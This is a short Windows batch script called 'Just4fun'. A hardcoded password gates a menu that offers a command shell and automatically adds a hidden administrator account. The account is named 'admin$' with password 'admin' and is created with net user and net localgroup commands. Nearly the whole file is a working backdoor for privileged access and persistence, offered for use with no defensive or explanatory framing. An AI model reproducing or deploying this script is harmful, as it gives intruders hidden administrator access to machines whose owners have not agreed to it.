@echo ================================================
@echo                    Just4fun
@echo ================================================
@echo _
@echo Input the password and i will give you a shell !
@set /p psw=:
@if %psw%==001986 goto showMenu
@echo _
@echo Sorry , not pass validation , please type {ENTER} to exit ~
@set /p xxx=
@exit

:showMenu
@cls
@echo you are pass,welcome !
@echo ================================================
@echo                  Just4fun
@echo ================================================
@echo _
@echo       1. give me a cmdshell
@echo       2. auto add an administrator account
@echo       3. exit
@echo _
@echo ================================================
@echo enter your selection:
@set /p sele=-
@if %sele%==1 cmd.exe
@if %sele%==2 goto addUser
@if %sele%==3 exit
@goto showMenu

:addUser
@net user admin$ admin /add&&net localgroup administrators admin$ /add
@cls
@echo _
@echo Successfully add an account !
@echo _
@pause
goto showMenu
